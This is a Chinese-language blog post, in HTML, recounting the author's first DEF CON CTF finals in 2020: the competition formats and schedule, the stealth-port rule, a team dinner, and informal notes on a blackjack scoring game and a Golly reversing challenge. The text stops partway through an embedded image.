&#x9898;&#x8FC7;&#x5206;&#x7B80;&#x5355;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x597D;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x8425;&#x517B;&#xFF0C;&#x53EF;&#x4EE5;&#x6743;&#x5F53;&#x5C0F;&#x8BF4;&#x770B;&#x770B;&#xFF0C;&#x535A;&#x541B;&#x4E00;&#x7B11;&#x3002;&#x5E76;&#x4E14;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4E00;&#x4E9B;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x9EBB;&#x70E6;&#xFF0C;&#x5168;&#x6587;&#x6D89;&#x53CA;&#x5230;&#x59D3;&#x540D; ID &#x5904;&#x6211;&#x90FD;&#x5C3D;&#x91CF;&#x4EE5;&#x67D0;&#x5E08;&#x5085;&#x8FDB;&#x884C;&#x79F0;&#x547C;&#x3002;</p><h1 id="The-First-DEFCON-Final-In-My-Life"><a href="#The-First-DEFCON-Final-In-My-Life" class="headerlink" title="The First DEFCON Final In My Life"></a>The First DEFCON Final In My Life</h1><h2 id="Simple-Introduction"><a href="#Simple-Introduction" class="headerlink" title="Simple Introduction"></a>Simple Introduction</h2><p>&#x4ECA;&#x5E74;&#x7684;&#x8D5B;&#x5236;&#x6211;&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B;&#xFF0C;&#x60F3;&#x8BE6;&#x7EC6;&#x4E86;&#x89E3;&#x7684;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E00;&#x4E0B;&#x5B98;&#x7F51;:<a href="https://oooverflow.io/dc-ctf-2020-finals/" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/</a></p><p>&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x7C7B;&#x578B;&#xFF0C;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x662F; AWD &#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F; KOH &#xFF0C;AWD &#x5C31;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x653B;&#x9632;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x6B21;&#x4E5F;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6; KOH &#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x7C7B;&#x578B;&#x5F80;&#x5F80;&#x662F;&#x9898;&#x76EE;&#x4E2D;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E2A;&#x79EF;&#x5206;&#x89C4;&#x5219;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5404;&#x4E2A;&#x961F;&#x4F0D;&#x5728;&#x6BCF;&#x4E2A; ROUND &#x5C3D;&#x53EF;&#x80FD;&#x62FF;&#x5230;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A; ROUND &#x53D6;&#x524D; N &#x540D;&#xFF0C;&#x6BCF;&#x4E2A; ROUND &#x7ED3;&#x675F;&#x7EDF;&#x8BA1;&#x5206;&#x6570;&#x5E76;&#x7ED9;&#x524D; N &#x540D;&#x7684;&#x961F;&#x4F0D;&#x5728;&#x603B;&#x699C;&#x7684; KOH &#x5217;&#x52A0;&#x5206;&#x3002;&#x5728; KOH &#x4E2D;&#x5982;&#x4F55;&#x62FF;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x51FA;&#x9898;&#x70B9;&#x4E86;&#xFF0C;&#x8FD9;&#x4E9B;&#x51FA;&#x9898;&#x70B9;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E9B;&#x8BBE;&#x7F6E;&#x7684;&#x6F0F;&#x6D1E;&#x6216;&#x8005;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x5F0F;&#x8BA9;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E2A; ROUND &#x5398;&#x9762;&#x5F97;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x7406;&#x89E3; KOH &#x7ED9;&#x4E86;&#x4F60;&#x4E00;&#x4E2A;&#x6E38;&#x620F;&#xFF0C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x6BCF;5&#x5206;&#x949F;&#x73A9;&#x4E00;&#x628A;&#x6E38;&#x620F;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BF9;&#x6E38;&#x620F;&#x5206;&#x6790;&#x6765;&#x627E;&#x5230;&#x4E00;&#x4E9B; bug &#x6216;&#x8005;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x70B9;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x70B9;&#x6765;&#x5E2E;&#x52A9;&#x4F60;&#x50CF;&#x201C;&#x5F00;&#x6302;&#x201D;&#x4E00;&#x6837;&#x5F97;&#x5206;&#x3002;</p><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><blockquote><p>&#x200B;    We&#x2019;ll start <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=Start+of+DEF+CON+CTF+finals&amp;iso=20200807T05&amp;p1=127" target="_blank" rel="noopener">5 AM Las Vegas time on Friday, August 7th</a> (4 AM for setup).</p><p>Here is the schedule (Nevada time == PDT):</p><ul><li>Shift 1: Friday 4am setup, 5am start, 1pm end</li><li><strong>First public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200807T14&amp;p1=127" target="_blank" rel="noopener">Friday 2 PM</a></strong></li><li>Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end</li><li><strong>Second public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200808T13&amp;p1=127" target="_blank" rel="noopener">Saturday 1 PM</a></strong></li><li>Shift 3: Saturday 2pm setup, 3pm start, 11pm end</li><li>Shift 4: Sunday 7am setup, 8am start, 4pm end</li><li><strong>Third public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200809T12&amp;p1=127" target="_blank" rel="noopener">Sunday at noon</a> (during the game)</strong></li></ul></blockquote><p>&#x8FD9;&#x8F6E;&#x7684;&#x65F6;&#x95F4;&#x53EF;&#x8C13;&#x662F;&#x76F8;&#x5F53;&#x7684;&#x6240;&#x8C13;&#x7684;&#x201C;&#x5065;&#x5EB7;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x8FF0;&#x65F6;&#x95F4;&#x8868;&#x7FFB;&#x8BD1;&#x5230;&#x5317;&#x4EAC;&#x65F6;&#x95F4;&#x8FC7;&#x6765;&#x5C31;&#x662F;&#xFF1A;</p><blockquote><ul><li>Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end</li><li>Shift 2: Saturday 12am setup, 1pm start,  9pm end</li><li>Shift 3: Sunday 5am setup, 6am start, 2pm end</li><li>Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end</li></ul></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6BCF;&#x4E2A; Shift &#x6BD4;&#x8D5B;&#x8FDB;&#x884C;8&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A; Shift &#x4E2D;&#x95F4;&#x95F4;&#x9694;8&#x5C0F;&#x65F6;&#xFF0C;&#x800C;&#x4E14;&#x662F;&#x6B63;&#x6B63;&#x597D;&#x597D;&#x7684;8&#x5C0F;&#x65F6; =.= &#x8FD9;&#x5C31;&#x662F;&#x6240;&#x8C13;&#x7684;&#x201C;&#x5065;&#x5EB7;&#x201D;&#x8D5B;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4ECE;&#x6BD4;&#x8D5B;&#x573A;&#x5730;&#x56DE;&#x5BB6;&#x4F11;&#x606F;&#x518D;&#x641E;&#x4F1A;&#x600E;&#x4E48;&#x90FD;&#x6CA1;&#x5269;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x4E86;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x8FD8;&#x4E0D;&#x5982;&#x786C;&#x809D;&#x597D;&#x4E86;&#xFF08;&#x53CD;&#x6B63;&#x6211;&#x89C9;&#x5F97;&#x6CA1;&#x51E0;&#x4E2A;&#x961F;&#x50CF;&#x6211;&#x8FD9;&#x4E2A;&#x6DF7;&#x5B50;&#x4E00;&#x6837;8&#x5C0F;&#x65F6;&#x5168;&#x7761;&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x5206;&#x4E86;4&#x8F6E;&#xFF0C;&#x8FD9;&#x662F;&#x771F;&#x7684;&#x809D;&#xFF0C;&#x4E8E;&#x662F;&#x90A3;&#x51E0;&#x5929;&#x6211;&#x7684;&#x4E16;&#x754C;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x4E00;&#x5929;16&#x5C0F;&#x65F6;&#x7684;&#x4E16;&#x754C;&#xFF0C;8&#x5C0F;&#x65F6;&#x770B;&#x9898;&#x5F53;&#x6DF7;&#x5B50;&#xFF0C;8&#x5C0F;&#x65F6;&#x7761;&#x89C9;&#x3002;&#xFF08;</p><h2 id="Stealth-Ports"><a href="#Stealth-Ports" class="headerlink" title="Stealth Ports"></a>Stealth Ports</h2><p>&#x5728; AWD &#x8D5B;&#x5236;&#x4E2D;&#xFF0C; OOO &#x52A0;&#x5165;&#x4E86; Stealth Ports &#x8FD9;&#x79CD;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>&#x200B;    New this year, each service will have a STEALTH port alongside it&#x2019;s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ain&#x2019;t cheap! If your team sends any traffic through a service&#x2019;s stealth port to a given team, you will only receive half points for stealing that team&#x2019;s flag that round.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4E3B;&#x529E;&#x65B9;&#x7ED9;&#x5927;&#x5BB6;&#x5F00;&#x653E;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x7ED9;&#x6D41;&#x91CF;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x653B;&#x51FB;&#x65B9;&#x6210;&#x529F;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x83B7;&#x53D6;&#x5230;&#x9632;&#x5B88;&#x65B9;&#x7684; Flag &#xFF0C;&#x5219; Flag &#x5206;&#x4F1A;&#x51CF;&#x534A;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x9690;&#x5F62;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x8840;&#x7684;&#x961F;&#x4F0D;&#x6BD4;&#x8F83;&#x6709;&#x5229;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x8FC5;&#x901F;&#x6253;&#x5168;&#x573A;&#x800C;&#x4E0D;&#x88AB;&#x6355;&#x83B7;&#x5230;&#x6D41;&#x91CF;&#xFF0C;&#x4F46;&#x662F;&#x5F97;&#x5206;&#x4F1A;&#x51CF;&#x534A;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x4E00;&#x79CD;&#x53CC;&#x5203;&#x5251;&#x3002;</p><h2 id="Before-Shift-1"><a href="#Before-Shift-1" class="headerlink" title="Before Shift 1"></a>Before Shift 1</h2><p>&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x6211;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x7684;&#x51C6;&#x5907;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x8BA8;&#x8BBA;&#x51B3;&#x5B9A;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x5728;&#x67D0;&#x5E08;&#x5085;&#x7684;&#x516C;&#x53F8;&#x91CC;&#x6253;&#x6BD4;&#x8D5B;&#xFF0C;&#x8FD9;&#x4E9B;&#x8BA8;&#x8BBA;&#x5305;&#x62EC;&#x4F46;&#x4E0D;&#x9650;&#x4E8E;&#x6BD4;&#x8D5B;&#x573A;&#x5730;&#x8981;&#x4E0D;&#x8981;&#x9009;&#x4E00;&#x4E2A;&#x522B;&#x5885;&#x5565;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x8003;&#x8651;&#x5230;&#x7F51;&#x7EDC;&#x95EE;&#x9898;&#x8FD8;&#x662F;&#x51B3;&#x5B9A;&#x4E86;&#x5728;&#x516C;&#x53F8;&#x91CC;&#xFF0C;&#x4EE5;&#x53CA;&#x5927;&#x5BB6;&#x8981;&#x4E0D;&#x8981;&#x4E00;&#x8D77;&#x5148;&#x5403;&#x4E2A;&#x996D;&#x505A;&#x4E2A;&#x8D5B;&#x524D;&#x52A8;&#x5458;&#x4EC0;&#x4E48;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x5C31;&#x5728;&#x5F00;&#x8D5B;&#x524D;2&#x5C0F;&#x65F6;&#x591A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0B;&#x5348;5&#x70B9;&#x591A;&#xFF0C;&#x6211;&#x968F;&#x6211; Mentor &#x5C31;&#x4E00;&#x8D77;&#x53BB;&#x8DDF;&#x961F;&#x5458;&#x4EEC;&#x5403;&#x4E86;&#x4E2A;&#x996D;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x8DDF;&#x5927;&#x5BB6;&#x8BA4;&#x8BC6;&#x8BA4;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x88AB;&#x6392;&#x5728;&#x4E86; Leader &#x65C1;&#x8FB9;&#x5750;&#xFF08;&#x7D27;&#x5F20;&#x6B7B;&#x4E86;&#xFF0C;&#x6709;&#x79CD;&#x9886;&#x5BFC;&#x5939;&#x83DC;&#x6211;&#x8F6C;&#x684C;&#x7684;&#x51B2;&#x52A8;&#xFF09;&#xFF0C;&#x7136;&#x540E; Leader &#x65C1;&#x8FB9;&#x53C8;&#x662F;&#x90A3;&#x4E2A;&#x7EDF;&#x6CBB;&#x5F3A;&#x7F51;&#x676F;&#x7684;&#x201C;&#x90A3;&#x4E2A;&#x7537;&#x4EBA;&#x201D;&#xFF08;&#x53C8;&#x7D27;&#x5F20;&#x6B7B;&#x4E86;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x8DDF;&#x8FD9;&#x79CD;&#x53EF;&#x6015;&#x7684;&#x5DE8;&#x578B;&#x5927;&#x4F6C;&#x751F;&#x7269;&#x8FDB;&#x884C;&#x4EA4;&#x6D41;&#xFF09;&#xFF0C;&#x6574;&#x4E2A;&#x4F1A;&#x9910;&#x5C31;&#x8FD9;&#x6837;&#x5728;&#x5BF9;&#x4E8E;&#x6211;&#x6765;&#x8BF4;&#x5728;&#x4E00;&#x79CD;&#x4E0D;&#x53EF;&#x540D;&#x72B6;&#x7684;&#x6C1B;&#x56F4;&#x4E0B;&#x7ED3;&#x675F;&#x4E86;&#x3002;XD&#xFF08;&#x611F;&#x89C9;&#x5176;&#x4ED6;&#x4EBA;&#x771F;&#x7684;&#x662F;&#x53C8;&#x5F3A;&#x53C8;&#x58EE;&#xFF0C;<small>&#x5C31;&#x6211;&#x4E00;&#x4E2A;&#x53EF;&#x601C;&#x5F31;&#x5C0F;&#x7684;&#x5C0F;&#x83DC;&#x9E21;</small></p><h2 id="Shift-1"><a href="#Shift-1" class="headerlink" title="Shift 1"></a>Shift 1</h2><p>&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x63A5;&#x5165;&#x7B49;&#x7B49;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#x5E08;&#x5085;&#x4EEC;&#x90FD;&#x505A;&#x5B8C;&#x4E86;&#xFF0C;&#x6211;&#x4FBF;&#x5728; setup &#x5C31;&#x5F00;&#x6DF7;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x5C2C;&#x7B49;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x3002;&#x7B2C;&#x4E00;&#x5929;&#x653E;&#x4E86;&#x8C8C;&#x4F3C;&#x4E24;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x7684; AWD &#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; KOH &#xFF0C;KOH &#x7ED9;&#x7684;&#x662F;&#x4E00;&#x4E2A; 21 &#x70B9;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x8DDF;&#x666E;&#x901A;&#x7684; 21 &#x70B9;&#x6E38;&#x620F;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x5E84;&#x5BB6;&#xFF0C;&#x6240;&#x6709;&#x961F;&#x4F0D;&#x90FD;&#x8FDB;&#x884C;&#x4E0B;&#x6CE8;&#xFF0C;&#x8981;&#x724C;&#x8D85;&#x8FC7; 21 &#x70B9;&#x7684;&#x961F;&#x4F0D;&#x5C31;&#x5728;&#x5F53;&#x524D; ROUND &#x76F4;&#x63A5;&#x51FA;&#x5C40;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x961F;&#x4F0D;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x6E38;&#x620F;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x6837;&#x7684;&#x65B9;&#x5F0F;&#x51B3;&#x51FA;&#x6E38;&#x620F;&#x79EF;&#x5206;&#x524D;&#x4E94;&#x540D;&#xFF0C;&#x5728;&#x5BF9;&#x5E94;&#x961F;&#x4F0D;&#x7684; KOH &#x5206;&#x6570;&#x4E0A;&#x8FDB;&#x884C;&#x52A0;&#x5206;&#x3002;</p><p>&#x4E00;&#x5F00;&#x59CB;&#x6CA1;&#x4EC0;&#x4E48;&#x961F;&#x4F0D;&#x5F97;&#x5206;&#xFF0C;&#x7531;&#x4E8E;&#x7ED9;&#x51FA;&#x7684;&#x662F; Web &#x5730;&#x5740;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x5F53;&#x4F5C; Web &#x9898;&#x6765;&#x505A;&#x4E86;&#xFF0C;&#x5404;&#x79CD;&#x6D4B;&#x4E86;&#x6D4B;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x867D;&#x7136;&#x8FD9;&#x4E2A; Web &#x5E73;&#x53F0;&#x662F; Flask &#x5E76;&#x4E14;&#x5F00;&#x4E86; Debug &#xFF0C;&#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x9519;&#x8BEF;&#x76F4;&#x63A5;&#x8DF3;&#x5230;&#x4E86; Debug &#x9519;&#x8BEF;&#x754C;&#x9762;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6709;&#x6D1E;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6765;&#x83B7;&#x53D6; PIN &#x7801;&#xFF0C;&#x8FD9;&#x6761;&#x8DEF;&#x5C31;&#x4F5C;&#x5E9F;&#x4E86;&#x3002;</p><p>&#x7136;&#x540E;&#x5341;&#x591A;&#x5206;&#x949F;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x6E10;&#x6E10;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5168;&#x5C40;&#x961F;&#x4F0D;&#x6240;&#x6709;&#x4EBA;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x867D;&#x7136;&#x6587;&#x4EF6;&#x6709;&#x4E00;&#x5B9A;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x4E14;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A;&#x6307;&#x4EE4;&#x7C7B;&#x578B;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x5F53;&#x65F6;&#x770B;&#x4E0D;&#x61C2;&#xFF0C;&#x4F46;&#x662F;&#x53D1;&#x73B0; A0E &#x5728;&#x5F97;&#x5206;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x62FF; A0E &#x7684;&#x8FC7;&#x6765;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5F97;&#x5206;&#x4E86;&#xFF08;</p><p>&#x540E;&#x9762;&#x624D;&#x77E5;&#x9053;&#x6211;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x662F;&#x4FEE;&#x6539;&#x4E86;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x4E0B;&#x6CE8;&#x7684;&#x79EF;&#x5206;&#xFF0C;&#x56E0;&#x4E3A;&#x521D;&#x59CB;&#x7684;&#x65F6;&#x5019;&#x6BCF;&#x4E2A;&#x961F;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x6B21;&#x628A;&#x81EA;&#x5BB6;&#x8EAB;&#x5BB6;200&#x4E00;&#x6B21;&#x4E0B;&#x5B8C;&#xFF0C;&#x800C;&#x8F93;&#x7684;&#x6982;&#x7387;&#x53C8;&#x5F88;&#x5927;&#xFF0C;&#x57FA;&#x672C;&#x7ACB;&#x9A6C;&#x5C31;&#x51FA;&#x5C40;&#x4E86;&#xFF0C;&#x7136;&#x800C;&#x901A;&#x8FC7;&#x4E00;&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x4E0B;&#x6CE8; 1 &#x4E2A;&#x79EF;&#x5206;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x7ACB;&#x9A6C;&#x7A33;&#x4F4F;&#x6218;&#x5C40;&#xFF0C;&#x81F3;&#x5C11;&#x53EF;&#x4EE5;&#x4E0D;&#x4F1A;&#x7ACB;&#x9A6C;&#x51FA;&#x5C40;&#x5C31;&#x53EF;&#x4EE5;&#x6392;&#x524D;&#x4E94;&#x4E0A;&#x5206;&#x4E86;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x5728; KOH &#x4E0A;&#x5206;&#x4E86;&#xFF0C;&#x5C31;&#x8FD9;&#x6837;&#x901A;&#x8FC7; KOH &#x5F97;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x7A33;&#x4F4F;&#x4E86;&#x524D;&#x4E00;&#x5929;&#x7684;&#x6392;&#x540D;&#xFF0C;&#x7B2C;&#x4E00;&#x5929;&#x7684;&#x5F97;&#x5206;&#x4E5F;&#x5C31;&#x57FA;&#x672C;&#x5168;&#x90FD;&#x6765;&#x81EA;&#x4E8E; KOH &#x3002;</p><h2 id="Shift-2-amp-Shift-3"><a href="#Shift-2-amp-Shift-3" class="headerlink" title="Shift 2 &amp; Shift 3"></a>Shift 2 &amp; Shift 3</h2><p>&#x7531;&#x4E8E;&#x65F6;&#x95F4;&#x4E5F;&#x6BD4;&#x8F83;&#x4E45;&#x8FDC;&#x4E86;&#xFF0C;&#x6211;&#x8BB0;&#x7684;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6E05;&#x695A;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A; Shift &#x5C31;&#x653E;&#x4E00;&#x8D77;&#x4E86;&#x3002;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x8C8C;&#x4F3C;&#x5927;&#x5BB6;&#x6CA1;&#x600E;&#x4E48;&#x6253; DEFCON QUALS &#x6216;&#x8005;&#x8BF4;&#x6253;&#x4E86;&#x7684;&#x5E08;&#x5085;&#x8FD9;&#x6B21; Final &#x6CA1;&#x6253;&#xFF1F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0; KOH &#x90A3;&#x4E2A;&#x9898;&#x662F;&#x6539;&#x81EA; DEFCON QUALS Fountain OOO REliving &#xFF0C;&#x662F;&#x4E00;&#x4E2A; Golly &#x76F8;&#x5173;&#x7684;&#x9006;&#x5411;&#x9898;&#xFF0C;&#x5F53;&#x65F6;&#x770B; QUALS &#x7684; WriteUp &#x4E5F;&#x662F;&#x76F8;&#x5F53;&#x5D29;&#x6E83;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x8FD9;&#x4E2A;&#x5C0F;&#x83DC;&#x9E21;&#x6CA1;&#x4EC0;&#x4E48;&#x9006;&#x5411;&#x57FA;&#x7840;&#xFF0C;&#x8DDF;&#x67D0;&#x5E08;&#x5085;&#x786C;&#x7740;&#x5934;&#x76AE;&#x641E;&#x4E5F;&#x6CA1;&#x600E;&#x4E48;&#x641E;&#x51FA;&#x6765;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x8FD8;&#x662F;&#x5347;&#x7EA7;&#x7248;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x9644;&#x4EF6;&#x56FE;&#x8FD8;&#x662F;&#x4E00;&#x8138;&#x61F5;&#x903C;&#x7684;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OB